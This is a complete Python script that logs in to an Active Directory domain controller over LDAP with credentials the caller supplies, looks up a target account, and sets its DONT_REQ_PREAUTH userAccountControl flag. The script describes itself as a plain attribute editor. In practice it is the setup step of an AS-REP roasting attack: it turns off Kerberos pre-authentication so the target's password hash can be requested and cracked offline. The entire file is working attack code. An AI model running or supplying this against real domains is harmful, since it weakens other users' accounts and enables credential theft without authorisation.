import ldap
import ldap.modlist as modlist
import argparse
parser = argparse.ArgumentParser(description="It is just tool to modify userAccountControl contribute")
parser.add_argument("-dc-ip", help="Domain Controller Ip Address", required=True)
parser.add_argument("-d", "--domain", help="Target domain", required=True)
parser.add_argument("-u", help="Username who has permission can modify userAccountControl", required=True)
parser.add_argument("-p", help="User Password who has permission can modify userAccountControl", required=True)
parser.add_argument("--target", help="Target username who can be modified by others", required=True)
args = parser.parse_args()

ipAddr = args.dc_ip
userName = args.u
userPass = args.p
domain = args.domain
target = args.target

LDAP_SERVER = 'ldap://' + ipAddr
USERNAME = userName + '@' + domain
PASSWORD = userPass
BASE_DN = ','.join(['DC=' + part for part in domain.split('.')])
TARGET_USER = target

conn = ldap.initialize(LDAP_SERVER)
conn.set_option(ldap.OPT_REFERRALS, 0)
conn.simple_bind_s(USERNAME, PASSWORD)

search_filter = f"(sAMAccountName={TARGET_USER})"
result = conn.search_s(BASE_DN, ldap.SCOPE_SUBTREE, search_filter, ['distinguishedName', 'userAccountControl'])
if not result:
    print("The target user does not exist in domain.")
    exit(1)

dn, attrs = result[0]
uac = int(attrs['userAccountControl'][0].decode())

DONT_REQ_PREAUTH = 4194304
new_uac = uac | DONT_REQ_PREAUTH
mods = [(ldap.MOD_REPLACE, 'userAccountControl', str(new_uac).encode())]
try:
    conn.modify_s(dn, mods)
    print(f"[+] {TARGET_USER} Successfully modified on userAccountControl ({uac} → {new_uac})")
except ldap.INSUFFICIENT_ACCESS:
    print(f"[-] Permission Denied.")
    exit(1)
except ldap.LDAPError as e:
    print(f"[-] There is something wrong with LDAP : {e}")
    exit(1)
conn.unbind()

